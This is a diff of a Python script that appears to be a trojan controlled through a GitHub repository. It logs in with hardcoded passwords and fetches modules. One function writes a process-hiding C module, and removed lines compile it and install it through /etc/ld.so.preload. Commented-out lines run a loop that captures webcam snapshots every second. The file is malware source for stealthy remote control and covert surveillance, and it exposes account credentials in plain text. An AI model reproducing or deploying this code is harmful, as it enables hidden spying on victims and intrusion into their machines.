@@ -8,7 +8,7 @@ import os
 from github3 import login
 
 def connect_to_github() :
-	gh = login("mehdi-desu",password="aptx@4869y")
+	gh = login("mehdi-desu",password="1090prixttc")
 	repo = gh.repository("mehdi-desu","projet_impossible")
 	branch = repo.branch("master")
 
@@ -40,17 +40,18 @@ def store_module_result() :
 
 def hide():
 	hider = get_file_contents("modules/hider.c")
-	f = open("hider.c","w")
+	f = open("processhider.c","w")
 	f.write(hider)
 	f.close
-	os.system("gcc -Wall -fPIC -shared -o hider.so hider.c -ldl")
-	os.rename("hider.so","/usr/local/lib/hider.so")
-	ff = open("/etc/ld.so.preload","w")
-	ff.write("/usr/local/lib/hider.so")
-	ff.close()
+#	os.system("gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl")
+#	os.rename("libprocesshider.so","/usr/local/lib/libprocesshider.so")
+#	ff = open("/etc/ld.so.preload","w")
+#	ff.write("/usr/local/lib/libprocesshider.so")
+#	ff.close()
 
 hide()
-cam = load_module("cam")
-while True:
-	cam.snap()
-	time.sleep(1)
+#cam = load_module("cam")
+#while True:
+#	cam.snap()
+#	print "ddd"
+#	time.sleep(1)
